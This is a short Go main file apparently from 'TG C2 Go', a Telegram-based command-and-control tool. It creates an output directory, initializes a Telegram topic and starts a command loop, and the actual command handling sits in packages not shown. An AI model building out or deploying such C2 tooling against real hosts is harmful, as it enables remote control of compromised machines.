package main

import (
	"fmt"
	"log"
	"os"
	"path/filepath"

	"TG_c2_go/config"
	"TG_c2_go/core"
)

func main() {
	fmt.Println("TG C2 Go - 启动中...")
	fmt.Println("作者: bamuwe (Go版本移植)")
	fmt.Println("版本: 1.0.0")
	
	// 创建输出目录
	if err := createOutputDirectory(); err != nil {
		log.Fatalf("创建输出目录失败: %v", err)
	}
	
	// 初始化Topic
	fmt.Println("正在初始化Telegram主题...")
	topicManager := core.NewTopicManager()
	if err := topicManager.InitializeTopic(); err != nil {
		log.Fatalf("初始化主题失败: %v", err)
	}
	
	fmt.Println("主题初始化完成")
	
	// 启动命令循环
	fmt.Println("启动命令处理循环...")
	commandLoop := core.NewCommandLoop()
	if err := commandLoop.Run(); err != nil {
		log.Fatalf("命令循环错误: %v", err)
	}
	
	fmt.Println("程序正常退出")
}

// createOutputDirectory 创建输出目录
func createOutputDirectory() error {
	outputDir := config.OUTPUT_DIR
	
	// 检查目录是否存在
	if _, err := os.Stat(outputDir); os.IsNotExist(err) {
		// 创建目录
		if err := os.MkdirAll(outputDir, 0755); err != nil {
			return fmt.Errorf("无法创建输出目录 %s: %v", outputDir, err)
		}
		fmt.Printf("输出目录已创建: %s\\n", outputDir)
	} else {
		fmt.Printf("输出目录已存在: %s\\n", outputDir)
	}
	
	// 获取绝对路径
	absPath, err := filepath.Abs(outputDir)
	if err == nil {
		fmt.Printf("输出目录绝对路径: %s\\n", absPath)
	}
	
	return nil
}
